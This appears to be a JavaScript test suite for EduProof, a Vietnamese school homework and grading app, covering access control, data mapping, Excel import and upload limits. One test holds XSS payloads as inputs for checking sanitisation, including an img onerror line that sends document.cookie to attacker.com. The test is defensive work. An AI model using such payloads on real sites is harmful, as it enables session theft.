// Self-check test suite for EduProof core business logic
const assert = require("assert");

console.log("🧪 Đang chạy kiểm thử hệ thống EduProof...");

// 1. Test: Image compression calculation logic
function computeTargetDimensions(width, height, maxDimension) {
  if (width <= maxDimension && height <= maxDimension) {
    return { width, height };
  }
  if (width > height) {
    return {
      width: maxDimension,
      height: Math.round((height * maxDimension) / width)
    };
  } else {
    return {
      width: Math.round((width * maxDimension) / height),
      height: maxDimension
    };
  }
}

const dim1 = computeTargetDimensions(4000, 3000, 1600);
assert.strictEqual(dim1.width, 1600, "Chiều rộng tối đa phải là 1600");
assert.strictEqual(dim1.height, 1200, "Tỷ lệ chiều cao phải giữ nguyên 4:3 (1200)");
console.log("✅ 1. Kiểm thử thuật toán tính toán kích thước nén ảnh: ĐẠT");

// 2. Test: Submission validation
function validateSubmission(photos, minRequired) {
  if (!Array.isArray(photos)) return false;
  return photos.length >= (minRequired || 1);
}

assert.strictEqual(validateSubmission([], 1), false, "Không có ảnh phải bị từ chối");
assert.strictEqual(validateSubmission(["p1.jpg", "p2.jpg"], 2), true, "Đủ số trang yêu cầu phải hợp lệ");
console.log("✅ 2. Kiểm thử ràng buộc số lượng ảnh minh chứng tối thiểu: ĐẠT");

// 3. Test: Score bounds and status transitions
function gradeSubmission(sub, score, feedback, requestResubmit) {
  if (requestResubmit) {
    sub.status = "resubmit_requested";
    sub.resubmitRequested = true;
    sub.grade = null;
    sub.feedback = feedback || "Yêu cầu chụp lại.";
    return sub;
  }

  if (score < 0 || score > 10 || isNaN(score)) {
    throw new Error("Điểm số ngoài khoảng 0 - 10");
  }

  sub.status = "graded";
  sub.resubmitRequested = false;
  sub.grade = score;
  sub.feedback = feedback;
  return sub;
}

const sampleSub = { id: "sub_1", status: "submitted", grade: null };
gradeSubmission(sampleSub, 8.5, "Tốt", false);
assert.strictEqual(sampleSub.status, "graded");
assert.strictEqual(sampleSub.grade, 8.5);

gradeSubmission(sampleSub, 0, "Ảnh mờ", true);
assert.strictEqual(sampleSub.status, "resubmit_requested");
assert.strictEqual(sampleSub.grade, null);
console.log("✅ 3. Kiểm thử chuyển đổi trạng thái chấm điểm và yêu cầu nộp lại: ĐẠT");

// 4. Test: Account Management - Only teacher can create student accounts
function createStudent(actingUser, usersList, studentData) {
  if (!actingUser || actingUser.role !== "teacher") {
    throw new Error("Chỉ giáo viên mới có quyền tạo tài khoản");
  }
  if (!studentData.username || !studentData.name) {
    throw new Error("Thiếu thông tin học sinh");
  }
  if (usersList.some((u) => u.username === studentData.username)) {
    throw new Error("Tên đăng nhập đã tồn tại");
  }
  const newUser = {
    id: "hs_" + Date.now(),
    role: "student",
    ...studentData
  };
  usersList.push(newUser);
  return newUser;
}

const testUsers = [
  { id: "gv_1", username: "gvcn-ngo-ha", password: "000000", role: "teacher" },
  { id: "hs_1", username: "hs_an", password: "123456", role: "student" }
];

// Student tries to create account -> blocked
assert.throws(() => {
  createStudent(testUsers[1], testUsers, { username: "hs_mai", name: "Trần Mai" });
}, /Chỉ giáo viên mới có quyền/);

// Teacher creates account -> success
const created = createStudent(testUsers[0], testUsers, { username: "hs_mai", name: "Trần Mai", class: "12A1" });
assert.strictEqual(created.role, "student");
assert.strictEqual(testUsers.length, 3);
console.log("✅ 4. Kiểm thử phân quyền tạo tài khoản học sinh bởi giáo viên: ĐẠT");

// 5. Test: Assignment Deletion (cleans up assignment & related submissions)
function deleteAssignmentCascade(assignmentsList, submissionsList, assignmentId) {
  const newAssignments = assignmentsList.filter((a) => a.id !== assignmentId);
  const newSubmissions = submissionsList.filter((s) => s.assignmentId !== assignmentId);
  return { newAssignments, newSubmissions };
}

const mockAssignments = [{ id: "asg_1" }, { id: "asg_2" }];
const mockSubmissions = [
  { id: "sub_1", assignmentId: "asg_1" },
  { id: "sub_2", assignmentId: "asg_2" },
  { id: "sub_3", assignmentId: "asg_1" }
];

const deleteRes = deleteAssignmentCascade(mockAssignments, mockSubmissions, "asg_1");
assert.strictEqual(deleteRes.newAssignments.length, 1);
assert.strictEqual(deleteRes.newSubmissions.length, 1);
assert.strictEqual(deleteRes.newSubmissions[0].assignmentId, "asg_2");
console.log("✅ 5. Kiểm thử xóa bài tập và dọn dẹp các bài nộp liên quan: ĐẠT");

// 6. Test: Campaign (Đợt bài tập) Roster Calculation
function calculateCampaignStats(studentsList, submissionsList, assignmentId) {
  const asgSubs = submissionsList.filter((s) => s.assignmentId === assignmentId);
  const submittedCount = asgSubs.length;
  const gradedCount = asgSubs.filter((s) => s.status === "graded").length;
  const notSubmittedCount = Math.max(0, studentsList.length - submittedCount);
  return { submittedCount, gradedCount, notSubmittedCount };
}

const mockStudents = [{ id: "s1" }, { id: "s2" }, { id: "s3" }];
const mockSubsForCampaign = [
  { studentId: "s1", assignmentId: "asg_1", status: "graded" }
];
const campaignStats = calculateCampaignStats(mockStudents, mockSubsForCampaign, "asg_1");
assert.strictEqual(campaignStats.submittedCount, 1);
assert.strictEqual(campaignStats.gradedCount, 1);
assert.strictEqual(campaignStats.notSubmittedCount, 2);
console.log("✅ 6. Kiểm thử thống kê tiến độ nộp bài theo đợt bài tập: ĐẠT");

// 7. Test: Gatekeeper Login & Session Independence
function checkAccessControl(sessionUser, requestedView) {
  if (!sessionUser) {
    return "LOGIN_REQUIRED";
  }
  if (requestedView === "teacher_view" && sessionUser.role !== "teacher") {
    return "ACCESS_DENIED";
  }
  if (requestedView === "student_view" && sessionUser.role !== "student") {
    return "ACCESS_DENIED";
  }
  return "ACCESS_GRANTED";
}

// Unauthenticated user must see login
assert.strictEqual(checkAccessControl(null, "student_view"), "LOGIN_REQUIRED");
assert.strictEqual(checkAccessControl(null, "teacher_view"), "LOGIN_REQUIRED");

// Student user cannot access teacher view
const studentSession = { id: "hs_1", role: "student" };
assert.strictEqual(checkAccessControl(studentSession, "student_view"), "ACCESS_GRANTED");
assert.strictEqual(checkAccessControl(studentSession, "teacher_view"), "ACCESS_DENIED");

// Teacher user cannot access student view directly (independent accounts)
const teacherSession = { id: "gv_1", role: "teacher" };
assert.strictEqual(checkAccessControl(teacherSession, "teacher_view"), "ACCESS_GRANTED");
assert.strictEqual(checkAccessControl(teacherSession, "student_view"), "ACCESS_DENIED");

console.log("✅ 7. Kiểm thử bảo vệ cổng đăng nhập & tính độc lập giữa học sinh - giáo viên: ĐẠT");

// 8. Test: Multi-Teacher Data Isolation
const multiTeachers = [
  { id: "gv_ha", username: "gvcn-ngo-ha", role: "teacher" },
  { id: "gv_nam", username: "gv-nam", role: "teacher" }
];

const multiStudents = [
  { id: "hs_an", name: "An", role: "student", teacherId: "gv_ha" },
  { id: "hs_mai", name: "Mai", role: "student", teacherId: "gv_ha" },
  { id: "hs_tuan", name: "Tuấn", role: "student", teacherId: "gv_nam" }
];

const multiAssignments = [
  { id: "asg_math", teacherId: "gv_ha", title: "Toán 12" },
  { id: "asg_eng", teacherId: "gv_nam", title: "Anh văn 12" }
];

// Check teacher Ha's scope
const haStudents = multiStudents.filter((s) => s.teacherId === "gv_ha");
const haAssignments = multiAssignments.filter((a) => a.teacherId === "gv_ha");
assert.strictEqual(haStudents.length, 2, "Cô Hà quản lý đúng 2 học sinh của mình");
assert.strictEqual(haAssignments.length, 1, "Cô Hà chỉ thấy 1 bài tập do mình tạo");
assert.strictEqual(haStudents.some((s) => s.id === "hs_tuan"), false, "Cô Hà không được thấy học sinh Tuấn của Thầy Nam");

// Check teacher Nam's scope
const namStudents = multiStudents.filter((s) => s.teacherId === "gv_nam");
assert.strictEqual(namStudents.length, 1, "Thầy Nam quản lý đúng 1 học sinh");
assert.strictEqual(namStudents[0].id, "hs_tuan");
console.log("✅ 8. Kiểm thử cô lập dữ liệu giữa các giáo viên khác nhau: ĐẠT");

// 9. Test: Admin Oversight & Teacher Hierarchy
function checkAdminCapabilities(adminUser, allTeachers, allStudents) {
  if (!adminUser || adminUser.role !== "admin") {
    throw new Error("Chỉ tài khoản admin mới có quyền quản trị trường");
  }
  return {
    totalTeachers: allTeachers.length,
    totalStudents: allStudents.length,
    studentsPerTeacher: allTeachers.map((t) => ({
      teacher: t.username,
      students: allStudents.filter((s) => s.teacherId === t.id)
    }))
  };
}

const adminUser = { id: "admin_root", username: "admin", role: "admin" };
const adminReport = checkAdminCapabilities(adminUser, multiTeachers, multiStudents);
assert.strictEqual(adminReport.totalTeachers, 2);
assert.strictEqual(adminReport.totalStudents, 3);
assert.strictEqual(adminReport.studentsPerTeacher[0].students.length, 2);
assert.strictEqual(adminReport.studentsPerTeacher[1].students.length, 1);

// Teacher trying to access admin function -> blocked
assert.throws(() => {
  checkAdminCapabilities(multiTeachers[0], multiTeachers, multiStudents);
}, /Chỉ tài khoản admin mới có quyền/);

console.log("✅ 9. Kiểm thử quyền giám sát toàn trường & quản lý giáo viên của Admin: ĐẠT");

// 10. Test: Supabase Cloud Data Mapping & Serialization
function mapSupabaseToApp(asgRow, subRow) {
  const asg = {
    id: asgRow.id,
    teacherId: asgRow.teacher_id,
    title: asgRow.title,
    subject: asgRow.subject,
    deadline: asgRow.deadline,
    description: asgRow.description,
    minPhotos: asgRow.min_photos,
    allowLink: asgRow.allow_link,
    allowNote: asgRow.allow_note,
    createdAt: asgRow.created_at
  };
  const sub = {
    id: subRow.id,
    assignmentId: subRow.assignment_id,
    studentId: subRow.student_id,
    studentName: subRow.student_name,
    submittedAt: subRow.submitted_at,
    status: subRow.status,
    photos: subRow.photos || [],
    linkProof: subRow.link_proof || "",
    studentNote: subRow.student_note || "",
    annotations: subRow.annotations || {},
    grade: subRow.grade,
    feedback: subRow.feedback || "",
    resubmitRequested: subRow.resubmit_requested || false
  };
  return { asg, sub };
}

const mockDbAsg = {
  id: "asg_101",
  teacher_id: "gvcn_ngo_ha",
  title: "Đại số 12 - Ôn tập",
  subject: "Toán",
  deadline: "2026-11-06T20:00:00Z",
  description: "Làm bài tập trang 45",
  min_photos: 2,
  allow_link: true,
  allow_note: true,
  created_at: "2026-11-05T08:00:00Z"
};
const mockDbSub = {
  id: "sub_202",
  assignment_id: "asg_101",
  student_id: "hs_an",
  student_name: "Nguyễn Văn An",
  submitted_at: "2026-11-05T10:00:00Z",
  status: "graded",
  photos: [{ id: "p1", data: "data:image/jpeg;base64,abc" }],
  link_proof: "https://drive.google.com/test",
  student_note: "Em đã hoàn thành bài 1 và 2",
  annotations: { 0: [{ type: "check", x: 100, y: 150 }] },
  grade: 9.5,
  feedback: "Làm bài rất tốt",
  resubmit_requested: false
};

const mapped = mapSupabaseToApp(mockDbAsg, mockDbSub);
assert.strictEqual(mapped.asg.teacherId, mockDbAsg.teacher_id);
assert.strictEqual(mapped.asg.minPhotos, 2);
assert.strictEqual(mapped.sub.assignmentId, mockDbSub.assignment_id);
assert.strictEqual(mapped.sub.grade, 9.5);
assert.strictEqual(mapped.sub.photos.length, 1);
assert.strictEqual(mapped.sub.annotations["0"][0].type, "check");
console.log("✅ 10. Kiểm thử ánh xạ chuẩn hóa cấu trúc dữ liệu Supabase Cloud: ĐẠT");

// 11. Test: Full Cloud Lifecycle (Teacher creates -> Student submits -> Teacher grades)
class MockSupabaseTable {
  constructor() { this.rows = []; }
  upsert(items) {
    for (const item of items) {
      const idx = this.rows.findIndex((r) => r.id === item.id);
      if (idx >= 0) this.rows[idx] = item;
      else this.rows.push(item);
    }
    return Promise.resolve({ data: items, error: null });
  }
  select() { return Promise.resolve({ data: [...this.rows], error: null }); }
}

const cloudAsgs = new MockSupabaseTable();
const cloudSubs = new MockSupabaseTable();

// 1. Teacher publishes assignment
cloudAsgs.upsert([mockDbAsg]);
// 2. Student queries assignments and submits work
cloudSubs.upsert([mockDbSub]);
// 3. Teacher updates grade on cloud
mockDbSub.grade = 10;
mockDbSub.feedback = "Đã chỉnh sửa hoàn hảo";
cloudSubs.upsert([mockDbSub]);

assert.strictEqual(cloudAsgs.rows.length, 1);
assert.strictEqual(cloudSubs.rows[0].grade, 10);
assert.strictEqual(cloudSubs.rows[0].feedback, "Đã chỉnh sửa hoàn hảo");
console.log("✅ 11. Kiểm thử vòng đời đồng bộ đám mây liên thông Giáo viên - Học sinh: ĐẠT");

// 12. Test: Excel Batch Student Row Parsing & Normalization
function normalizeHeaderKey(key) {
  return (key || "")
    .toString()
    .toLowerCase()
    .replace(/đ/g, "d")
    .replace(/Đ/g, "d")
    .normalize("NFD")
    .replace(/[\u0300-\u036f]/g, "")
    .replace(/[^a-z0-9]/g, "");
}

function parseMockExcelRows(rows, teacherId, defaultClass) {
  const result = [];
  rows.forEach((row, idx) => {
    let name = "";
    let username = "";
    let studentClass = "";
    let password = "";

    Object.keys(row).forEach((col) => {
      const norm = normalizeHeaderKey(col);
      const val = row[col] ? row[col].toString().trim() : "";
      if (norm.includes("tendangnhap") || norm.includes("dangnhap") || norm.includes("taikhoan") || norm.includes("username") || norm === "user" || norm.includes("mahs")) {
        if (!username) username = val;
      } else if (norm.includes("ten") || norm.includes("hoten") || norm.includes("hovaten") || norm.includes("fullname") || norm === "name" || norm.includes("hocsinh")) {
        if (!name) name = val;
      } else if (norm.includes("lop") || norm.includes("class")) {
        if (!studentClass) studentClass = val;
      } else if (norm.includes("matkhau") || norm.includes("password") || norm === "mk") {
        if (!password) password = val;
      }
    });

    if (!name) return; // skip row without name

    result.push({
      id: "hs_" + Date.now() + "_" + idx,
      name,
      username: username || ("hs_" + idx),
      class: studentClass || defaultClass,
      password: password || "123456",
      role: "student",
      teacherId
    });
  });
  return result;
}

const rawExcelSample = [
  { "Họ và tên": "Đặng Thị Thảo", "Tên đăng nhập": "hs_thao", "Lớp": "12A1", "Mật khẩu": "pass123" },
  { "Tên học sinh": "Bùi Tuấn Anh", "Tài khoản": "hs_tuananh", "Lớp học": "12A1", "MK": "000000" },
  { "name": "Vũ Lan Hương", "username": "", "class": "", "password": "" }, // missing optional fields
  { "Ghi chú": "Không phải học sinh" } // invalid row to skip
];

const parsedStudents = parseMockExcelRows(rawExcelSample, "gvcn_ngo_ha", "12A1");
assert.strictEqual(parsedStudents.length, 3, "Chỉ 3 dòng có tên hợp lệ được parse");
assert.strictEqual(parsedStudents[0].name, "Đặng Thị Thảo");
assert.strictEqual(parsedStudents[0].password, "pass123");
assert.strictEqual(parsedStudents[1].username, "hs_tuananh");
assert.strictEqual(parsedStudents[2].name, "Vũ Lan Hương");
assert.strictEqual(parsedStudents[2].class, "12A1", "Tự động gán lớp mặc định nếu trống");
assert.strictEqual(parsedStudents[2].password, "123456", "Tự động gán mật khẩu 123456 nếu trống");
assert.strictEqual(parsedStudents[2].teacherId, "gvcn_ngo_ha", "Gán đúng quyền quản lý cho giáo viên");
console.log("✅ 12. Kiểm thử nhận diện và chuẩn hóa cột dữ liệu Excel đa dạng: ĐẠT");

// 13. Test: Batch Student Creation to Supabase Cloud Payload
const cloudBatchPayload = parsedStudents.map((s) => ({
  id: s.id,
  username: s.username,
  password: s.password,
  name: s.name,
  role: s.role,
  class: s.class,
  teacher_id: s.teacherId
}));
assert.strictEqual(cloudBatchPayload.length, 3);
assert.strictEqual(cloudBatchPayload[0].teacher_id, "gvcn_ngo_ha");
console.log("✅ 13. Kiểm thử đóng gói dữ liệu hàng loạt đẩy lên Supabase Cloud: ĐẠT");

// 14. Test: Session & State Retention across F5 (Page Refresh)
class MockStorage {
  constructor() { this.store = {}; }
  getItem(k) { return this.store[k] || null; }
  setItem(k, v) { this.store[k] = String(v); }
  removeItem(k) { delete this.store[k]; }
}

const mockLocalStorage = new MockStorage();
const mockSessionStorage = new MockStorage();

function simulateLogin(user, teacherTab) {
  mockLocalStorage.setItem("eduproof_auth_user", JSON.stringify(user));
  mockSessionStorage.setItem("eduproof_auth_user", JSON.stringify(user));
  mockLocalStorage.setItem("eduproof_teacher_tab", teacherTab || "submissions");
}

function simulateRefreshF5(usersList) {
  const savedAuth = mockLocalStorage.getItem("eduproof_auth_user") || mockSessionStorage.getItem("eduproof_auth_user");
  let restoredUser = null;
  if (savedAuth) {
    const parsed = JSON.parse(savedAuth);
    restoredUser = usersList.find((u) => u.username === parsed.username) || parsed;
  }
  const restoredTab = mockLocalStorage.getItem("eduproof_teacher_tab") || "submissions";
  return { currentUser: restoredUser, teacherActiveTab: restoredTab };
}

function simulateLogout() {
  mockLocalStorage.removeItem("eduproof_auth_user");
  mockSessionStorage.removeItem("eduproof_auth_user");
  mockLocalStorage.removeItem("eduproof_teacher_tab");
}

// 1. User logs in as Teacher on students tab
const teacherUser = { id: "gvcn_ngo_ha", username: "gvcn-ngo-ha", role: "teacher" };
simulateLogin(teacherUser, "students");

// 2. F5 is pressed -> session & tab are restored perfectly
const stateAfterF5 = simulateRefreshF5([teacherUser]);
assert.notStrictEqual(stateAfterF5.currentUser, null, "currentUser không được là null sau F5");
assert.strictEqual(stateAfterF5.currentUser.username, "gvcn-ngo-ha", "Đúng tài khoản giáo viên");
assert.strictEqual(stateAfterF5.teacherActiveTab, "students", "Giữ nguyên tab danh sách học sinh đang mở");

// 3. User logs out explicitly -> session cleared
simulateLogout();
const stateAfterLogoutF5 = simulateRefreshF5([teacherUser]);
assert.strictEqual(stateAfterLogoutF5.currentUser, null, "Sau đăng xuất thì về màn hình đăng nhập");

console.log("✅ 14. Kiểm thử duy trì phiên làm việc & tab đang xem khi nhấn F5: ĐẠT");

// 15. Test: XSS Sanitization & Malicious URL Blocking
function sanitizeText(str) {
  if (str === null || str === undefined) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function sanitizeUrl(url) {
  if (!url) return "#";
  const trimmed = String(url).trim();
  if (/^https?:\/\//i.test(trimmed)) {
    return sanitizeText(trimmed);
  }
  return "#";
}

const xssPayload1 = "<script>alert('Hacked')</script>";
const xssPayload2 = "<img src=x onerror=fetch('http://attacker.com?c='+document.cookie)>";
const safeText1 = sanitizeText(xssPayload1);
const safeText2 = sanitizeText(xssPayload2);
assert.strictEqual(safeText1.includes("<script>"), false, "Thẻ script phải bị mã hóa HTML");
assert.strictEqual(safeText1.includes("&lt;script&gt;"), true, "Thẻ script chuyển thành entity an toàn");
assert.strictEqual(safeText2.includes("<img"), false, "Thẻ img tấn công onerror phải bị vô hiệu hóa");

const maliciousLink1 = "javascript:alert(document.domain)";
const maliciousLink2 = "data:text/html,<script>alert(1)</script>";
const legitimateLink = "https://drive.google.com/file/d/123/view";
assert.strictEqual(sanitizeUrl(maliciousLink1), "#", "Link javascript: độc hại phải bị chặn về #");
assert.strictEqual(sanitizeUrl(maliciousLink2), "#", "Link data: độc hại phải bị chặn về #");
assert.strictEqual(sanitizeUrl(legitimateLink), legitimateLink, "Link https:// hợp lệ được phép giữ nguyên");
console.log("✅ 15. Kiểm thử phòng chống tấn công XSS và chặn link độc hại: ĐẠT");

// 16. Test: Photo Upload Constraints (MIME Type & Size Limits)
function validateUploadFile(file) {
  const maxBytes = 15 * 1024 * 1024; // 15MB
  if (!file.type.startsWith("image/")) {
    return { valid: false, reason: "NOT_IMAGE" };
  }
  if (file.size > maxBytes) {
    return { valid: false, reason: "FILE_TOO_LARGE" };
  }
  return { valid: true };
}

const testImgOk = { name: "bai_lam.jpg", type: "image/jpeg", size: 1.5 * 1024 * 1024 };
const testImgLarge = { name: "bai_lam_khung.jpg", type: "image/jpeg", size: 20 * 1024 * 1024 };
const testExe = { name: "hack.exe", type: "application/x-msdownload", size: 1024 };

assert.strictEqual(validateUploadFile(testImgOk).valid, true);
assert.strictEqual(validateUploadFile(testImgLarge).valid, false);
assert.strictEqual(validateUploadFile(testImgLarge).reason, "FILE_TOO_LARGE");
assert.strictEqual(validateUploadFile(testExe).valid, false);
assert.strictEqual(validateUploadFile(testExe).reason, "NOT_IMAGE");
console.log("✅ 16. Kiểm thử ràng buộc bảo mật tệp đính kèm (MIME và dung lượng tối đa): ĐẠT");

// 17. Test: Cloud Assignment Sync & Deletion Lifecycle
function syncAssignmentsBetweenTeacherAndStudent(teacherUser, studentUser, asgList) {
  // Teacher creates an assignment
  const newAsg = {
    id: "asg_cloud_99",
    teacherId: teacherUser.id,
    title: "Văn 12 - Nghị luận xã hội",
    subject: "Ngữ văn",
    deadline: new Date().toISOString()
  };
  asgList.push(newAsg);

  // Student queries their assignments
  const studentVisible = asgList.filter(
    (a) => a.teacherId === studentUser.teacherId || !a.teacherId || a.teacherId === "gvcn_ngo_ha"
  );
  assert.strictEqual(studentVisible.some((a) => a.id === newAsg.id), true, "Học sinh phải thấy bài tập mới của GV");

  // Teacher deletes the assignment
  const updatedAsgList = asgList.filter((a) => a.id !== newAsg.id);
  const studentVisibleAfterDelete = updatedAsgList.filter(
    (a) => a.teacherId === studentUser.teacherId || !a.teacherId || a.teacherId === "gvcn_ngo_ha"
  );
  assert.strictEqual(studentVisibleAfterDelete.some((a) => a.id === newAsg.id), false, "Bài tập đã xóa không còn hiển thị với học sinh");

  return true;
}

const teacherT = { id: "gvcn_ngo_ha", role: "teacher" };
const studentS = { id: "hs_an", role: "student", teacherId: "gvcn_ngo_ha" };
syncAssignmentsBetweenTeacherAndStudent(teacherT, studentS, []);
console.log("✅ 17. Kiểm thử đồng bộ hai chiều tạo và xóa bài tập giữa Giáo viên và Học sinh: ĐẠT");

// 18. Test: Storage upload with fallback logic
async function mockUploadPhotoToStorage(mockSb, dataUrl, filePath) {
  if (!mockSb || !dataUrl || !dataUrl.startsWith("data:")) return null;
  try {
    const res = await mockSb.storage.from("proofs").upload(filePath, dataUrl);
    if (res.error) return null;
    return mockSb.storage.from("proofs").getPublicUrl(filePath).data.publicUrl;
  } catch (e) {
    return null;
  }
}

// Case 1: Storage online & bucket exists -> returns public storage URL
const mockSbOk = {
  storage: {
    from: () => ({
      upload: async () => ({ error: null }),
      getPublicUrl: (p) => ({ data: { publicUrl: `https://test.supabase.co/storage/v1/object/public/proofs/${p}` } })
    })
  }
};
// Case 2: Storage bucket not found -> fallback gracefully (returns null)
const mockSbFail = {
  storage: {
    from: () => ({
      upload: async () => ({ error: { message: "Bucket not found" } }),
      getPublicUrl: () => ({ data: null })
    })
  }
};

(async () => {
  const urlOk = await mockUploadPhotoToStorage(mockSbOk, "data:image/jpeg;base64,abc", "submissions/asg1/hs1/p1.jpg");
  assert.strictEqual(urlOk, "https://test.supabase.co/storage/v1/object/public/proofs/submissions/asg1/hs1/p1.jpg");

  const urlFail = await mockUploadPhotoToStorage(mockSbFail, "data:image/jpeg;base64,abc", "submissions/asg1/hs1/p1.jpg");
  assert.strictEqual(urlFail, null, "Khi bucket chưa tạo phải fallback về null (giữ nguyên base64)");
})();
console.log("✅ 18. Kiểm thử tải ảnh lên Supabase Storage với cơ chế fallback Base64 an toàn: ĐẠT");

// 19. Test: RPC Identity Verification & Anti-Impersonation
function mockRpcSubmitHomework(usersTable, submissionsTable, p) {
  // 1. Xác thực học sinh & mật khẩu
  const student = usersTable.find((u) => u.id === p.studentId && u.password === p.password && u.role === "student");
  if (!student) {
    throw new Error("Xác thực không thành công: Mã học sinh hoặc mật khẩu không chính xác.");
  }
  // 2. Không cho phép nộp đè nếu bài đã chấm
  const existing = submissionsTable.find((s) => s.assignmentId === p.assignmentId && s.studentId === p.studentId);
  if (existing && existing.status === "graded") {
    throw new Error("Bài nộp này đã được giáo viên chấm điểm. Không thể sửa.");
  }
  return { success: true };
}

const mockUsers = [
  { id: "hs_an", password: "123", role: "student" },
  { id: "hs_binh", password: "456", role: "student" },
  { id: "gv_ha", password: "000", role: "teacher" }
];
const mockSubs = [
  { id: "sub_1", assignmentId: "asg_1", studentId: "hs_an", status: "graded", grade: 9 }
];

// Chính chủ nộp bài mới -> Thành công
assert.strictEqual(
  mockRpcSubmitHomework(mockUsers, mockSubs, { studentId: "hs_binh", password: "456", assignmentId: "asg_1" }).success,
  true
);

// Kẻ mạo danh nộp bài thay hs_binh nhưng không biết mật khẩu -> Bị chặn
assert.throws(() => {
  mockRpcSubmitHomework(mockUsers, mockSubs, { studentId: "hs_binh", password: "wrong", assignmentId: "asg_1" });
}, /Mã học sinh hoặc mật khẩu không chính xác/);

// Học sinh cố tình nộp đè lên bài đã được chấm điểm 9 -> Bị chặn
assert.throws(() => {
  mockRpcSubmitHomework(mockUsers, mockSubs, { studentId: "hs_an", password: "123", assignmentId: "asg_1" });
}, /đã được giáo viên chấm điểm/);

console.log("✅ 19. Kiểm thử xác thực RPC submit_homework chống nộp thay & chống sửa điểm: ĐẠT");

// 20. Test: RPC login_user (Secure Authentication without Password Leaks)
function mockRpcLoginUser(usersTable, username, password) {
  const user = usersTable.find((u) => u.username === username && u.password === password);
  if (!user) return null;
  return {
    id: user.id,
    username: user.username,
    name: user.name,
    role: user.role,
    class: user.class,
    subject: user.subject,
    teacherId: user.teacherId
  };
}

const userDir = [
  { id: "admin_root", username: "admin", password: "123", name: "Admin", role: "admin" },
  { id: "gv_ha", username: "gv-ha", password: "000", name: "Cô Hà", role: "teacher" },
  { id: "hs_an", username: "hs-an", password: "111", name: "An", role: "student", teacherId: "gv_ha" }
];

// Login đúng -> Trả về profile không chứa password của người khác
const loginOk = mockRpcLoginUser(userDir, "hs-an", "111");
assert.strictEqual(loginOk.username, "hs-an");
assert.strictEqual(loginOk.role, "student");
assert.strictEqual(loginOk.password, undefined, "Mật khẩu không được trả về trong payload công khai");

// Login sai -> Trả về null
assert.strictEqual(mockRpcLoginUser(userDir, "hs-an", "sai_pass"), null);
console.log("✅ 20. Kiểm thử RPC login_user xác thực bảo mật & chống lộ mật khẩu: ĐẠT");

// 21. Test: RPC get_my_students (Teacher Scoped Student Access)
function mockRpcGetMyStudents(usersTable, teacherId, password) {
  const teacher = usersTable.find((u) => u.id === teacherId && u.password === password && (u.role === "teacher" || u.role === "admin"));
  if (!teacher) {
    throw new Error("Xác thực giáo viên không thành công.");
  }
  if (teacher.role === "admin") {
    return usersTable.filter((u) => u.role === "student");
  }
  return usersTable.filter((u) => u.role === "student" && u.teacherId === teacherId);
}

// Giáo viên đúng mật khẩu -> Chỉ lấy được học sinh lớp mình
const teacherStudents = mockRpcGetMyStudents(userDir, "gv_ha", "000");
assert.strictEqual(teacherStudents.length, 1);
assert.strictEqual(teacherStudents[0].id, "hs_an");

// Học sinh mạo danh giáo viên -> Bị chặn
assert.throws(() => {
  mockRpcGetMyStudents(userDir, "hs_an", "111");
}, /Xác thực giáo viên không thành công/);

console.log("✅ 21. Kiểm thử RPC get_my_students phân quyền tài khoản theo lớp của giáo viên: ĐẠT");

console.log("\n🎉 TẤT CẢ CÁC BÀI KIỂM THỬ ĐÃ VƯỢT QUA THÀNH CÔNG (21/21)!");
